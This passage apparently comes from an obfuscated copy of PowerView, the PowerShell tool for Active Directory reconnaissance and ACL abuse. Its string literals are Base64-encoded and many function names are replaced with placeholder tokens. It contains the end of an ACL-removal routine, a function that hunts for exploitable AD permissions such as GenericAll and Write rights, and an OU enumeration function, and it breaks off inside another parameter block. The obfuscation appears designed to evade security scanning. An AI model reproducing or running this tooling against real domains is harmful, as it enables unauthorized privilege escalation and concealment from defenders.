                Write-Verbose "[Remove-DomainObjectAcl] Removing principal $(${423}.distinguishedname) '$Rights' from $(${422}.Properties.distinguishedname)"
                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${423}.objectsid)
                    if (${430}) {
                        ForEach (${364} in ${430}) {
                            ${429} = New-Object Guid ${364}
                            ${428} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))
                            ${426} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, ${428}, ${427}, ${429}, $InheritanceType
                        }
                    }
                    else {
                        ${428} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                        ${426} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, ${428}, ${427}, $InheritanceType
                    }
                    ForEach (${425} in ${426}) {
                        Write-Verbose "[Remove-DomainObjectAcl] Granting principal $(${423}.distinguishedname) rights GUID '$(${425}.ObjectType)' on $(${422}.Properties.distinguishedname)"
                        ${424} = ${422}.GetDirectoryEntry()
                        ${424}.PsBase.Options.SecurityMasks = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA=')))
                        ${424}.PsBase.ObjectSecurity.RemoveAccessRule(${425})
                        ${424}.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Remove-DomainObjectAcl] Error removing principal $(${423}.distinguishedname) '$Rights' from $(${422}.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function Find-InterestingDomainAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $Domain,
        [Switch]
        $ResolveGUIDs,
        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${403} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))]) { ${403}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))] = $ResolveGUIDs }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))]) { ${403}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))] = $RightsFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${403}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${403}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${403}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${403}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${403}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${403}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${403}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${403}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${395} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbwBiAGoAZQBjAHQAYwBsAGEAcwBzAA==')))
            'Raw' = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${395}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${395}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${395}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${395}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${395}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${395}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${390} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${390}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${390}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${421} = @{}
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${403}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
            ${390}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
        }
        f112 @403 | % {
            if ( ($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAB8AFcAcgBpAHQAZQB8AEMAcgBlAGEAdABlAHwARABlAGwAZQB0AGUA')))) -or (($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))) -and ($_.AceQualifier -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))))) {
                if ($_.SecurityIdentifier.Value -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAuACoALQBbADEALQA5AF0AXABkAHsAMwAsAH0AJAA=')))) {
                    if (${421}[$_.SecurityIdentifier.Value]) {
                        ${420}, ${419}, ${418}, ${417} = ${421}[$_.SecurityIdentifier.Value]
                        ${416} = New-Object PSObject
                        ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $_.ObjectDN
                        ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAUQB1AGEAbABpAGYAaQBlAHIA'))) $_.AceQualifier
                        ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $_.ObjectAceType
                        }
                        else {
                            ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
                        }
                        ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUARgBsAGEAZwBzAA=='))) $_.AceFlags
                        ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAVAB5AHAAZQA='))) $_.AceType
                        ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGgAZQByAGkAdABhAG4AYwBlAEYAbABhAGcAcwA='))) $_.InheritanceFlags
                        ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIA'))) $_.SecurityIdentifier
                        ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAE4AYQBtAGUA'))) ${420}
                        ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQAbwBtAGEAaQBuAA=='))) ${419}
                        ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQATgA='))) ${418}
                        ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEMAbABhAHMAcwA='))) ${417}
                        ${416}
                    }
                    else {
                        ${418} = f111 -Identity $_.SecurityIdentifier.Value -f40 DN @390
                        if (${418}) {
                            ${419} = ${418}.SubString(${418}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            ${395}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${419}
                            ${395}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${418}
                            $Object = f98 @395
                            if ($Object) {
                                ${420} = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))) {
                                    ${417} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))
                                }
                                elseif ($Object.Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))) {
                                    ${417} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))
                                }
                                elseif ($Object.Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))) {
                                    ${417} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))
                                }
                                else {
                                    ${417} = $Null
                                }
                                ${421}[$_.SecurityIdentifier.Value] = ${420}, ${419}, ${418}, ${417}
                                ${416} = New-Object PSObject
                                ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $_.ObjectDN
                                ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAUQB1AGEAbABpAGYAaQBlAHIA'))) $_.AceQualifier
                                ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $_.ObjectAceType
                                }
                                else {
                                    ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
                                }
                                ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUARgBsAGEAZwBzAA=='))) $_.AceFlags
                                ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAVAB5AHAAZQA='))) $_.AceType
                                ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGgAZQByAGkAdABhAG4AYwBlAEYAbABhAGcAcwA='))) $_.InheritanceFlags
                                ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIA'))) $_.SecurityIdentifier
                                ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAE4AYQBtAGUA'))) ${420}
                                ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQAbwBtAGEAaQBuAA=='))) ${419}
                                ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQATgA='))) ${418}
                                ${416} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEMAbABhAHMAcwA='))) ${417}
                                ${416}
                            }
                        }
                        else {
                            Write-Warning "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName"
                        }
                    }
                }
            }
        }
    }
}
function f101 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        ${f26},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${48} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${414} = f74 @48
    }
    PROCESS {
        if (${414}) {
            ${251} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${252} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${252} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBPAFUAPQAuACoA')))) {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMgA1ADIAfQApAA==')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${254} = ${252}.SubString(${252}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7ADIANQA0AH0AJwAgAGYAcgBvAG0AIAAnACQAewAyADUAMgB9ACcA')))
                        ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${254}
                        ${414} = f74 @48
                        if (-not ${414}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsAMgA1ADQAfQAnAA==')))
                        }
                    }
                }
                else {
                    try {
                        ${253} = (-Join (([Guid]${252}).ToByteArray() | % {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADIANQAzAH0AKQA=')))
                    }
                    catch {
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7ADIANQAyAH0AKQA=')))
                    }
                }
            }
            if (${251} -and (${251}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewAyADUAMQB9ACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAEwAaQBuAGsA')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAE8AVQBzACAAdwBpAHQAaAAgACQAewBmADIANgB9ACAAcwBlAHQAIABpAG4AIAB0AGgAZQAgAGcAcABMAGkAbgBrACAAcAByAG8AcABlAHIAdAB5AA==')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAJAB7AGYAMgA2AH0AKgApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAAVQBzAGkAbgBnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            ${414}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AbwByAGcAYQBuAGkAegBhAHQAaQBvAG4AYQBsAFUAbgBpAHQAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: $(${414}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${72} = ${414}.FindOne() }
            else { ${72} = ${414}.FindAll() }
            ${72} | ? {$_} | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ${415} = $_
                }
                else {
                    ${415} = f104 -Properties $_.Properties
                }
                ${415}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBPAFUA'))))
                ${415}
            }
            if (${72}) {
                try { ${72}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                }
            }
            ${414}.dispose()
        }
    }
}
function f100 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        ${f26},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
